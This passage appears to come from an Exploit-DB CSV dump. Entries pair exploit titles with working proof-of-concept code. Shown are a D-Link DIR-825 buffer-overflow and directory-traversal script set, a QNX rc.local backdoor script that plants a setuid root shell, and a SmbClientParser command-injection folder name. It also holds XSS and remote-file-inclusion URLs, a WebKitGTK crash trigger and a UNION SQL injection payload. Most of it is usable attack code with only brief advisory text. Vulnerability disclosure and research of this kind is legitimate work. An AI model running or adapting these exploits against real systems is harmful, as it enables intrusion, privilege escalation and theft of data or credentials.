x04\x00\x00\x01\xBD\x00\x00\x01\xCD\x00\x00\x01\xAE\x00\x00\x01\x7E\x00\x00\x01\x8B\x00\x00\x01\x91\x00\x00\x01\x97\x00\x00\x01\x5C\x00\x00\x01\x3F\x00\x00\x01\x8B\x00\x00\x01\x56\x00\x00\x01\x23\x00\x00\x01\x16\x00\x00\x01\x04\x00\x00\x01\x03\x00\x00\x01\x05\x00\x00\x01\x07\x00\x00\x00\xF7\x00\x00\x01\x70\x00\x00\x01\x9B\x00\x00\x01\x6D\x00\x00\x01\x37\x00\x00\x01\x33\x00\x00\x01\x69\x00\x00\x01\x5D\x00\x00\x01\x26\x00\x00\x01\x06\x00\x00\x01\x60\x00\x00\x01\x8A\x00\x00\x01\x4D\x00\x00\x01\x1C\x00\x00\x01\x19\x00\x00\x01\x13\x00\x00\x01\x0D\x00\x00\x01\x07\x00\x00\x00\xFC\x00\x00\x01\x01\x00\x00\x01\x2C\x00\x00\x01\x6C\x00\x00\x01\x6B\x00\x00\x01\x13\x00\x00\x01\x41\x00\x00\x01\xC4\x00\x00\x01\xC2\x00\x00\x01\xB2\x00\x00\x01\x81\x00\x00\x01\x5C\x00\x00\x01\x4A\x00\x00\x01\x25\x00\x00\x01\x29\x00\x00\x01\x2F\x00\x00\x01\x40\x00\x00\x01\x44\x00\x00\x01\x1C\x00\x00\x01\x04\x00\x00\x01\x65\x00\x00\x01\x89\x00\x00\x01\x77\x00\x00\x01\x65\x00\x00\x01\x5D\x00\x00\x01\x68\x00\x00\x01\x6F\x00\x00\x01\x46\x00\x00\x01\x13\x00\x00\x01\x44\x00\x00\x01\x60\x00\x00\x01\x40\x00\x00\x01\x3B\x00\x00\x01\x3A\x00\x00\x01\x3F\x00\x00\x01\x1B\x00\x00\x01\x12\x00\x00\x00\xFE\x00\x00\x01\x48\x00\x00\x01\xA5\x00\x00\x01\x86\x00\x00\x01\x82\x00\x00\x01\x6A\x00\x00\x01\x64\x00\x00\x01\x6A\x00\x00\x01\x61\x00\x00\x01\x39\x00\x00\x01\x3A\x00\x00\x01\x59\x00\x00\x01\x54\x00\x00\x01\x2F\x00\x00\x01\x2A\x00\x00\x01\x2E\x00\x00\x01\x2F\x00\x00\x01\x1F\x00\x00\x01\x2B\x00\x00\x01\x46\x00\x00\x01\x79\x00\x00\x01\x88\x00\x00\x01\x59\x00\x00\x01\x52\x00\x00\x01\x5B\x00\x00\x01\x81\x00\x00\x01\x6A\x00\x00\x01\x27\x00\x00\x01\x10\x00\x00\x01\x7C\x00\x00\x01\x69\x00\x00\x01\x3B\x00\x00\x01\x10\x00\x00\x01\x10\x00\x00\x01\x0A\x00\x00\x01\x04\x00\x00\x00\xFC\x00\x00\x01\x07\x00\x00\x01\x04\x00\x00\x01\x33\x00\x00\x01\x7C\x00\x00\x01\x44\x00\x00\x01\x0A\x00\x00\x01\x50\x00\x00\x01\xB8\x00\x00\x01\xAD\x00\x00\x01\x7E\x00\x00\x01\x58\x00\x00\x01\x66\x00\x00\x01\x4E\x00\x00\x01\x2E\x00\x00\x01\x3F\x00\x00\x01\x3D\x00\x00\x01\x43\x00\x00\x01\x44\x00\x00\x01\x1A\x00\x00\x01\x11\x00\x00\x01\x65\x00\x00\x01\xA4\x00\x00\x01\x7C\x00\x00\x01\x5E\x00\x00\x01\x58\x00\x00\x01\x87\x00\x00\x01\x77\x00\x00\x01\x43\x00\x00\x01\x21\x00\x00\x01\x68\x00\x00\x01\x5A\x00\x00\x01\x25\x00\x00\x01\x14\x00\x00\x01\x0A\x00\x00\x01\x12\x00\x00\x01\x16\x00\x00\x01\x06\x00\x00\x01\x02\x00\x00\x01\x33\x00\x00\x01\xD1\x00\x00\x01\xC2\x00\x00\x01\x9C\x00\x00\x01\x92\x00\x00\x01\x8D\x00\x00\x01\xA1\x00\x00\x01\x90\x00\x00\x01\x51\x00\x00\x01\x50\x00\x00\x01\x75\x00\x00\x01\x46\x00\x00\x01\x19\x00\x00\x01\x16\x00\x00\x01\x0A\x00\x00\x01\x04\x00\x00\x01\x03\x00\x00\x00\xFE\x00\x00\x00\xFD\x00\x00\x01\x9F\x00\x00\x01\x8E\x00\x00\x01\x67\x00\x00\x01\x3A\x00\x00\x01\x5C\x00\x00\x01\x73\x00\x00\x01\x57\x00\x00\x01\x15\x00\x00\x01\x12\x00\x00\x01\x8B\x00\x00\x01\x79\x00\x00\x01\x4D\x00\x00\x01\x46\x00\x00\x01\x30\x00\x00\x01\x25\x00\x00\x01\x14\x00\x00\x01\x16\x00\x00\x01\x06\x00\x00\x01\x03\x00\x00\x01\x75\x00\x00\x01\x9B\x00\x00\x01\x6A\x00\x00\x01\x29\x00\x00\x01\x83\x00\x00\x01\xC9\x00\x00\x01\xC8\x00\x00\x01\xA5\x00\x00\x01\x9A\x00\x00\x01\x5D\x00\x00\x01\x4A\x00\x00\x01\x1D\x00\x00\x01\x2E\x00\x00\x01\x36\x00\x00\x01\x47\x00\x00\x01\x3E\x00\x00\x01\x19\x00\x00\x01\x1F\x00\x00\x01\x8F\x00\x00\x01\x8D\x00\x00\x01\x6E\x00\x00\x01\x5E\x00\x00\x01\x64\x00\x00\x01\x5B\x00\x00\x01\x63\x00\x00\x01\x37\x00\x00\x01\x22\x00\x00\x01\x66\x00\x00\x01\x54\x00\x00\x01\x39\x00\x00\x01\x45\x00\x00\x01\x41\x00\x00\x01\x2F\x00\x00\x01\x22\x00\x00\x01\x18\x00\x00\x01\x18\x00\x00\x01\x67\x00\x00\x01\x9F\x00\x00\x01\x7A\x00\x00\x01\x6A\x00\x00\x01\x6A\x00\x00\x01\x65\x00\x00\x01\x6A\x00\x00\x01\x4A\x00\x00\x01\x29\x00\x00\x01\x48\x00\x00\x01\x5F\x00\x00\x01\x49\x00\x00\x01\x34\x00\x00\x01\x3D\x00\x00\x01\x33\x00\x00\x01\x28\x00\x00\x01\x27\x00\x00\x01\x3C\x00\x00\x01\x48\x00\x00\x01\x90\x00\x00\x01\x7F\x00\x00\x01\x53\x00\x00\x01\x59\x00\x00\x01\x53\x00\x00\x01\x7E\x00\x00\x01\x5D\x00\x00\x01\x25\x00\x00\x01\x1C\x00\x00\x01\x7C\x00\x00\x01\x5C\x00\x00\x01\x29\x00\x00\x01\x28\x00\x00\x01\x0E\x00\x00\x01\x02\x00\x00\x01\x05\x00\x00\x00\xF6\x00\x00\x01\x04\x00\x00\x01\x09\x00\x00\x01\x5A\ avi  = open('poc.mp4', 'wb+') avi.write(Data)      avi.close() print  ""[-] MP4 file generated""",local,dos,1
38718,"D-Link DIR-825 (vC) - Multiple Vulnerabilities ## Advisory Information  Title: DIR-825 (vC) Buffer overflows in authentication,HNAP and ping functionalities. Also a directory traversal   issue exists which can be exploited Vendors contacted: William Brown <william.brown@dlink.com>, Patrick Cline patrick.cline@dlink.com(Dlink) CVE: None  Note: All these security issues have been discussed with the vendor and vendor indicated that they have fixed   issues as per the email communication. The vendor had also released the information on their security advisory   pages http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10060,  http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10061  However, the vendor has taken now the security advisory pages down and hence the information needs to be publicly   accessible so that users using these devices can update the router firmwares.The author (Samuel Huntley) releasing   this finding is not responsible for anyone using this information for malicious purposes.   ## Product Description  DIR-825 (vC) -- Wireless AC750 Dual Band Gigabit Cloud Router. Mainly used by home and small offices.  ## Vulnerabilities Summary  Have come across 4 security issues in DIR-825 firmware which allows an attacker to exploit buffer overflows in   authentication, HNAP and Ping functionalities. first 2 of the buffer overflows in auth and HNAP  can be exploited   by an unauthentictaed attacker. The attacker can be on wireless LAN or WAN if mgmt interface is exposed to attack   directly or using XSRF if not exposed. The ping functionality based buffer overflow and directory traversal would   require an attacker to be on network and use XSRF to exploit buffer overflow whereas would require some sort of   authentication as low privileged user atleast to exploit directory traversal.  ## Details  Buffer overflow in auth  ------------------------------------------------------------------------------------------------------------------  ---- import socket import struct   ''' 287 + XXXX in query_string value, right now only working with Exit address as sleep address has bad chars which   disallows from using regular shellcode directly '''  buf = ""GET /dws/api/Login?test="" buf+=""B""*251 buf+=""CCCC"" #s0 buf+=""FFFF"" #s1 buf+=""FFFF"" #s2 buf+=""FFFF"" #s3 buf+=""XXXX"" #s4 buf+=""HHHH"" #s5 buf+=""IIII"" #s6 buf+=""JJJJ"" #s7 buf+=""LLLL"" buf+=""\x2a\xbc\x8c\xa0"" # retn address buf+=""C""*24 # buf+=""sh;;""  buf+=""K""*20 buf+=""\x2a\xc0\xd2\xa0"" #s1 buf+=""\x2a\xc0\xd2\xa0"" #s1 buf  +=""CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC  CCCCCCCCCCCCCCCCC"" buf+=""&password=A HTTP/1.1\r\nHOST: 10.0.0.90\r\nUser-Agent: test\r\nAccept:text/html,application/xhtml  +xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection:keep-alive\r\n\r\n""   print ""[+] sending buffer size"", len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((""10.0.0.90"", 80)) s.send(buf) soc=s.recv(2048) print soc ------------------------------------------------------------------------------------------------------------------  ----   Buffer overflow in HNAP ------------------------------------------------------------------------------------------------------------------  ---- import socket import struct   ''' 4138 + XXXX in SoapAction value, right now only working with Exit address as sleep address has bad chars which   disallows from using regular shellcode directly '''  buf = ""POST /HNAP1/ HTTP/1.1\r\n"" buf+= ""Host: 10.0.0.90\r\n"" buf+=""SOAPACTION:http://purenetworks.com/HNAP1/GetDeviceSettings/""+""A""*4138+""\x2a\xbc\x8c\xa0""+""D""*834+""\r\n"" buf+=""Proxy-Connection: keep-alive\r\n"" buf+=""Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==\r\n"" buf+""Cache-Control: max-age=0\r\n"" buf+=""Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"" buf+=""User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143   Safari/537.36\r\n"" buf+=""Accept-Encoding: gzip,deflate,sdch\r\n"" buf+=""Accept-Language: en-US,en;q=0.8\r\n"" buf+=""Cookie: uid:1111;\r\n"" buf+=""Content-Length: 13\r\n\r\ntest=test\r\n\r\n""   print ""[+] sending buffer size"", len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((""10.0.0.90"", 80)) s.send(buf) soc=s.recv(2048) print soc ------------------------------------------------------------------------------------------------------------------  ----  Directory traversal  ------------------------------------------------------------------------------------------------------------------  ---- import socket import struct   ''' Useful to do directory traversal attack which is possible in html_response_page variable below which prints the   conf file, but theoretically any file, most likely only after login accessible ''' payload=""html_response_page=../etc/host.conf&action=do_graph_auth&login_name=test&login_pass=test1&login_n=test2&l  og_pass=test3&graph_code=63778&session_id=test5&test=test"" buf = ""POST /apply.cgi HTTP/1.1\r\n"" buf+= ""Host: 10.0.0.90\r\n"" buf+=""Proxy-Connection: keep-alive\r\n"" buf+=""Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==\r\n"" buf+""Cache-Control: max-age=0\r\n"" buf+=""Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"" buf+=""User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143   Safari/537.36\r\n"" buf+=""Accept-Encoding: gzip,deflate,sdch\r\n"" buf+=""Accept-Language: en-US,en;q=0.8\r\n"" buf+=""Cookie: session_id=test5;\r\n"" buf+=""Content-Length: ""+str(len(payload))+""\r\n\r\n"" buf+=payload+""\r\n\r\n""   print ""[+] sending buffer size"", len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((""10.0.0.90"", 80)) s.send(buf) soc=s.recv(2048) print soc ------------------------------------------------------------------------------------------------------------------  ----   Buffer overflow in ping  ------------------------------------------------------------------------------------------------------------------  ---- import socket import struct   ''' 282 + XXXX in ping_ipaddr value, right now only working with Exit address as sleep address has bad chars which   disallows from using regular shellcode directly ''' payload=""html_response_page=tools_vct.asp&action=ping_test&html_response_return_page=tools_vct.asp&ping=ping&ping_  ipaddr=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB  BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB  BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB""+""\x2a\xbc\x8c\xa0""+""CCXXXXDDDDEEEE&test=test"" buf = ""POST /ping_response.cgi HTTP/1.1\r\n"" buf+= ""Host: 10.0.0.90\r\n"" buf+=""Proxy-Connection: keep-alive\r\n"" buf+=""Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==\r\n"" buf+""Cache-Control: max-age=0\r\n"" buf+=""Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"" buf+=""User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143   Safari/537.36\r\n"" buf+=""Accept-Encoding: gzip,deflate,sdch\r\n"" buf+=""Accept-Language: en-US,en;q=0.8\r\n"" buf+=""Cookie: session_id=test5;\r\n"" buf+=""Content-Length: ""+str(len(payload))+""\r\n\r\n"" buf+=payload+""\r\n\r\n""   print ""[+] sending buffer size"", len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((""10.0.0.90"", 80)) s.send(buf) soc=s.recv(2048) print soc   ------------------------------------------------------------------------------------------------------------------  ----  ## Report Timeline  * April 26, 2015: Vulnerability found by Samuel Huntley and reported to William Brown and Patrick Cline. * July 17, 2015: Vulnerability was fixed by Dlink as per the email sent by the vendor * Nov 13, 2015: A public advisory is sent to security mailing lists.  ## Credit  This vulnerability was found by Samuel Huntley",remote,remote,1
32084,"SmbClientParser 2.7 Perl Module - Remote Command Execution source: https://www.securityfocus.com/bid/30290/info  The SmbClientParser Perl module is prone to a remote command-execution vulnerability because it fails to sufficiently sanitize user-supplied data.  Successfully exploiting this issue will allow an attacker to execute arbitrary commands with the privileges of the user running applications that use the module.  Filesys::SmbClientParser 2.7 is vulnerable; other versions may also be affected.  Name a folder the following: ' x && xterm &#  A shared folder containing this named folder will execute the following command: /usr/bin/smbclient ""//x.x.x.x/vulns"" -U ""user%pass"" -d0 -c 'cd ""'x && xterm &#""' -D ""/poc""",remote,remote,1
30606,"Urchin 5.7.x - 'session.cgi' Cross-Site Scripting source: https://www.securityfocus.com/bid/25788/info  Urchin is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   http://target/session.cgi?""><script>alert('XSS')</script><",remote,webapps,1
46651,"WebKitGTK+ - 'ThreadedCompositor' Race Condition <!-- VULNERABILITY DETAILS The compositor thread in WebKitGTK+ might alter a FilterOperation object's reference count variable at the same time as the main thread. Then the reference count corruption might lead to a UAF condition.   REPRODUCTION CASE -->  <html> <style> @keyframes foo {     0% { opacity: 0; }     100% { opacity: 1; } }  div {   animation-name: foo;   animation-duration: 1s;   animation-iteration-count: infinite;   filter: saturate(50%); } </style> <body> <script>     frame = document.createElement(""iframe"");      setInterval(_ => {       frame.remove();       document.body.appendChild(frame);        doc = frame.contentDocument;       doc.head.appendChild(document.querySelector(""style"").cloneNode(true));        elt = document.createElement(""div"");       elt.textContent = ""foo"";       let elements = [];        for (let i = 0, count = Math.random() * 50; i < count; ++i) {         elements[i] = doc.body.appendChild(elt.cloneNode(true));         elements[i].clientWidth;       }     }, Math.random() * 500); </script> </body> </html>  <!-- VERSION Reproduced on WebKitGTK+ build revision 240647. This bug doesn't seem to affect WebKit on macOS/iOS. -->",remote,dos,1
33888,ProArcadeScript - 'search.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/39749/info  ProArcadeScript is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/search.php?searchstr= [XSS],remote,webapps,1
1481,"QNX RTOS 6.3.0 - Insecure 'rc.local' Permissions System Crash / Privilege Escalation #!/bin/sh # this combines http://www.idefense.com/intelligence/vulnerabilities/display.php?id=387 # and http://www.idefense.com/intelligence/vulnerabilities/display.php?id=386 # into local r00t w00t t00t t00t, hugs and kisses from www.lort.dk.  # unset PAGER; man chmod | mail -s ""urgent reading"" support@qnx.com # kokanin discovered this around august/september 2004 echo ""performing check"" if [ -w /etc/rc.d/rc.local ] ;  then echo ""check passed, backdooring system"" &&  cat >/tmp/moo.c << __EOF__ && cd /tmp && make moo && echo ""chown root /tmp/moo\ && chmod 6755 /tmp/moo"" >> /etc/rc.d/rc.local && echo ""rc.local backdoored,\  crashing system"" && echo -e ""break *0xb032d59f\nr\ncont\ncont"" | gdb gdb;  int main(){ setuid(0); system(""/bin/sh""); } __EOF__ else echo ""system is not a default QNX 6.3.0 install, or someone set correct permissions manually, sorry""; fi  # milw0rm.com [2006-02-08]",local,local,1
17164,"Microsoft Reader 2.1.1.3143 - Null Byte Write #######################################################################                               Luigi Auriemma  Application:  Microsoft Reader               http://www.microsoft.com/reader Versions:     <= 2.1.1.3143 (PC version)               the Origami 2.6.1.7169 version doesn't seem vulnerable               the non-PC versions have not been tested Platforms:    Windows, Windows Mobile, Tablet PC and UMPC devices Bug:          writing of NULL byte in arbitrary location Date:         11 Apr 2011 Author:       Luigi Auriemma               e-mail: aluigi@autistici.org               web:    aluigi.org   #######################################################################   1) Introduction 2) Bug 3) The Code 4) Fix   #######################################################################  =============== 1) Introduction ===============   Microsoft Reader is a software needed to read and catalog the ebooks in LIT format and the Audible audio books bought via internet, indeed the homepage acts also as online store for these protected contents.   #######################################################################  ====== 2) Bug ======   Possibility to write a 0x00 byte in an arbitrary memory location. From aud_file.dll (base address 5fff0000):    5FFF634A >|> 8D47 01        |LEA EAX,DWORD PTR DS:[EDI+1]             ; size at offset 0xbd of the PoC   5FFF634D  |. 50             |PUSH EAX   5FFF634E  |. E8 2B470000    |CALL <JMP.&MSVCRT.??2@YAPAXI@Z>          ; malloc   5FFF6353  |. 57             |PUSH EDI   5FFF6354  |. 50             |PUSH EAX   5FFF6355  |. FF75 08        |PUSH DWORD PTR SS:[EBP+8]   5FFF6358  |. 8945 F8        |MOV DWORD PTR SS:[EBP-8],EAX   5FFF635B  |. E8 58460000    |CALL <JMP.&utils.?read_bytes@TypeIO@@SA> ; read   5FFF6360  |. 8B45 F8        |MOV EAX,DWORD PTR SS:[EBP-8]   5FFF6363  |. 83C4 10        |ADD ESP,10   5FFF6366  |. 802438 00      |AND BYTE PTR DS:[EAX+EDI],0              ; place the delimiter (all ok)   5FFF636A  |. 807D FF 00     |CMP BYTE PTR SS:[EBP-1],0   5FFF636E  |. 75 5B          |JNZ SHORT aud_file.5FFF63CB   5FFF6370  |. 8D46 01        |LEA EAX,DWORD PTR DS:[ESI+1]             ; size at offset 0xc1 of the PoC   5FFF6373  |. 50             |PUSH EAX   5FFF6374  |. E8 05470000    |CALL <JMP.&MSVCRT.??2@YAPAXI@Z>          ; now malloc will return NULL   5FFF6379  |. 8BD8           |MOV EBX,EAX   5FFF637B  |. 56             |PUSH ESI   5FFF637C  |. 53             |PUSH EBX   5FFF637D  |. FF75 08        |PUSH DWORD PTR SS:[EBP+8]   5FFF6380  |. E8 33460000    |CALL <JMP.&utils.?read_bytes@TypeIO@@SA> ; read   5FFF6385  |. 802433 00      |AND BYTE PTR DS:[EBX+ESI],0              ; exploitation  The first allocation must succeed to avoid problems during the reading operations (like memcpy on 0x00000000).  Note that is not possible to exploit the visible integer overflow caused by malloc(size + 1) because the function that reads the data goes in endless loop, yeah bad.  The provided proof-of-concept first tries to allocate 0x44000000 bytes and it should succeed without problems and then will try to allocate the second size that MUST fail so that is possible to use the size value as an arbitrary memory offset.  Modified bytes in the proof-of-concept: 000000BD   00       43  ; first size needed to steal memory to the next size 000000BE   00       FF 000000BF   00       FF 000000C0   0A       FF 000000C1   00       61  ; second size, will try to write 0x00 at address 0x61616161 000000C2   00       61 000000C3   00       61 000000C4   16       61   #######################################################################  =========== 3) The Code ===========   http://aluigi.org/poc/msreader_5.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/17164.zip   #######################################################################  ====== 4) Fix ======   No fix.   #######################################################################",remote,dos,1
4084,XOOPS Module wiwimod 0.4 - Remote File Inclusion # XOOPS Module WiwiMod v0.4 (spaw_root) RFI Vulnerability  # D.Script:        http://codigolivre.org.br/frs/download.php/1745/xoops2-mod_wiwimod_0.4_xavier_jimenez.zip  # V.Code :       include $spaw_root.'config/spaw_control.config.php';       include $spaw_root.'class/toolbars.class.php';       include $spaw_root.'class/lang.class.php';  # In :       /spaw/spaw_control.class.php  # Exploits:       /modules/wiwimod/spaw/spaw_control.class.php?spaw_root=Shell.txt?  #D0Rk:       allinurl:/modules/wiwimod/   # Discovered by:       GoLd_M = [Mahmood_ali]  # Homepage:       http://www.Tryag.Com/cc  # Sp.Thanx To :       Tryag-Team & Asb-May's Team  # milw0rm.com [2007-06-20],remote,webapps,1
4543,"PHPDJ 0.5 - 'djpage.php' Remote File Inclusion ################################################################ PHPDJ v05 (page) Remote File Inclusion Vulnerability D.S: http://sourceforge.net/projects/phpdj/ D0RK : allintext:""PHPDJ was created by www.php-mania.co.uk"" POC :        /PHPDJ_v05/dj/djpage.php?page=evil-script.txt? ################################################################ Thanx To : Tryag.Com/cc & Asb-May.net/bb ################################################################  # milw0rm.com [2007-10-17]",remote,webapps,1
28158,QTO File Manager 1.0 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/18791/info  QTO File Manager is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input before displaying it to users of the application.  An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://target.xx/qtofm.php?delete=%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%3E&u=[username]&pathext=1 http://target.xx/qtofm.php?delete=COPYING&u=[username]&pathext=%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script% 3E  http://target.xx/qtofm.php?u=[username]&pathext=%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%3E&edit=1 http://target.xx/qtofm.php?u=[username]&pathext=1&edit=%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%3E --- POST http://target.xx:80/qtofm.php?u=[username]&pathext=1&edit=readme%2Etxt HTTP/1.0  Accept: */* Content-Type: application/x-www-form-urlencoded Host: target.xx Content-Length: 117 u=[username]&pathext=%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%3E&newcontent=1&save=Save&savefile=1 -------- http://target.xx/qtofm.php?edit=../../../../../../../../../../../../etc/passwd&u=[username]&pathext= http://target.xx/qtofm.php?edit=qtofm.php&u=[username]&pathext=,remote,webapps,1
42239,"Microsoft Windows - 'USP10!otlSinglePosLookup::getCoverageTable' Uniscribe Font Processing Out-of-Bounds Memory Read Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1203  We have encountered a crash in the Windows Uniscribe user-mode library, in the USP10!otlSinglePosLookup::getCoverageTable function, while trying to display text using a corrupted TTF font file:  --- (7f0.488): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=03670ffe ebx=0365c048 ecx=03671000 edx=03671000 esi=03671000 edi=0024e9d4 eip=77500808 esp=0024e918 ebp=0024e918 iopl=0         nv up ei pl zr na pe nc cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 USP10!otlSinglePosLookup::getCoverageTable+0x48: 77500808 668b4802        mov     cx,word ptr [eax+2]      ds:0023:03671000=???? 0:000> kb  # ChildEBP RetAddr  Args to Child               00 0024e918 77502c4b 0024e9d4 03671000 03671000 USP10!otlSinglePosLookup::getCoverageTable+0x48 01 0024e964 77504860 03670ffe 534f5047 00000001 USP10!GetSubtableCoverage+0xab 02 0024ea10 77504c29 534f5047 0367f132 00003ece USP10!BuildTableCache+0x240 03 0024ea48 774fed73 0024ea6c 00004000 0367f000 USP10!BuildCache+0x79 04 0024ea74 774e4fec 0024eaa0 00004000 0024eb44 USP10!BuildOtlCache+0x53 05 0024ecc0 774bd37b 0024edb8 0024ed48 0024ecd8 USP10!ShapingCreateFontCacheData+0x4cc 06 0024edc0 774bd8ef 03663e20 0024f148 00000004 USP10!ShlLoadFont+0x6b 07 0024f02c 774b9317 3c0102ac 0024f0b8 00000000 USP10!LoadFont+0x54f 08 0024f048 774b9630 3c0102ac 0024f070 7750d468 USP10!FindOrCreateFaceCache+0xe7 09 0024f150 774b99bb 3c0102ac 03656124 3c0102ac USP10!FindOrCreateSizeCacheWithoutRealizationID+0xf0 0a 0024f178 774ba528 3c0102ac 03656124 03656124 USP10!FindOrCreateSizeCacheUsingRealizationID+0xbb 0b 0024f19c 774ba692 03656124 3c0102ac 03656000 USP10!UpdateCache+0x38 0c 0024f1b0 774b7918 3c0102ac 000004a0 00000400 USP10!ScriptCheckCache+0x62 0d 0024f1cc 760a1736 3c0102ac 03656040 00000001 USP10!ScriptStringAnalyse+0x198 0e 0024f218 760a18c1 3c0102ac 0024f69e 00000001 LPK!LpkStringAnalyse+0xe5 0f 0024f314 760a17b4 3c0102ac 00000000 00000000 LPK!LpkCharsetDraw+0x332 10 0024f348 77df56a9 3c0102ac 00000000 00000000 LPK!LpkDrawTextEx+0x40 11 0024f388 77df5a64 3c0102ac 00000048 00000000 USER32!DT_DrawStr+0x13c 12 0024f3d4 77df580f 3c0102ac 0024f69e 0024f6a0 USER32!DT_GetLineBreak+0x78 13 0024f480 77df5882 3c0102ac 00000000 00000009 USER32!DrawTextExWorker+0x250 14 0024f4a4 77df5b68 3c0102ac 0024f69c ffffffff USER32!DrawTextExW+0x1e [...]  0:000> !heap -p -a eax     address 03670ffe found in     _DPH_HEAP_ROOT @ 3651000     in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)                                  3651d98:          3670c40              3c0 -          3670000             2000     73388e89 verifier!AVrfDebugPageHeapAllocate+0x00000229     77d26206 ntdll!RtlDebugAllocateHeap+0x00000030     77cea127 ntdll!RtlpAllocateHeap+0x000000c4     77cb5950 ntdll!RtlAllocateHeap+0x0000023a     72e0ae6a vrfcore!VfCoreRtlAllocateHeap+0x0000002a     774c6724 USP10!UspAllocCache+0x00000054     774bad00 USP10!GetOtlTables+0x000000d0     774d777f USP10!CheckUpdateFontDescriptor+0x0000002f     774bd8e2 USP10!LoadFont+0x00000542     774b9317 USP10!FindOrCreateFaceCache+0x000000e7     774b9630 USP10!FindOrCreateSizeCacheWithoutRealizationID+0x000000f0     774b99bb USP10!FindOrCreateSizeCacheUsingRealizationID+0x000000bb     774ba528 USP10!UpdateCache+0x00000038     774ba692 USP10!ScriptCheckCache+0x00000062     774b7918 USP10!ScriptStringAnalyse+0x00000198     760a1736 LPK!LpkStringAnalyse+0x000000e5     760a18c1 LPK!LpkCharsetDraw+0x00000332     760a17b4 LPK!LpkDrawTextEx+0x00000040     77df56a9 USER32!DT_DrawStr+0x0000013c     77df5a64 USER32!DT_GetLineBreak+0x00000078     77df580f USER32!DrawTextExWorker+0x00000250     77df5882 USER32!DrawTextExW+0x0000001e     77df5b68 USER32!DrawTextW+0x0000004d [...] ---  The issue reproduces on Windows 7, and could be potentially used to disclose sensitive data from the process heap. It is easiest to reproduce with PageHeap enabled, but it is also possible to observe a crash in a default system configuration. In order to reproduce the problem with the provided samples, it might be necessary to use a custom program which displays all of the font's glyphs at various point sizes.  Attached are 3 proof of concept malformed font files which trigger the crash.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42239.zip",remote,dos,0
43042,"FS Indiamart Clone - 'keywords' SQL Injection # Exploit Title: FS Indiamart Clone - SQL Injection # Date: 2017-10-23 # Exploit Author: 8bitsec # Vendor Homepage: https://fortunescripts.com/ # Software Link: https://fortunescripts.com/product/indiamart-clone/ # Version: 23 October 17 # Tested on: [Kali Linux 2.0 | Mac OS 10.12.6] # Email: contact@8bitsec.io # Contact: https://twitter.com/_8bitsec  Release Date: ============= 2017-10-23  Product & Service Introduction: =============================== The most favored web solution for webmasters aspiring to launch B2B Portals at minimum investment of time, money and effort.  Technical Details & Description: ================================  SQL injection on [keywords] parameter.  Proof of Concept (PoC): =======================  SQLi:  https://localhost/[path]/search.php?keywords=product') UNION ALL SELECT NULL,CONCAT(0x716b787071,0x506961776c6f79515068694b454e736668707675627448527949566e434472706a72624a466a5468,0x7171627171)-- LEhA&rctyp=Products  Parameter: keywords (GET)     Type: UNION query     Title: Generic UNION query (NULL) - 2 columns     Payload: keywords=product') UNION ALL SELECT 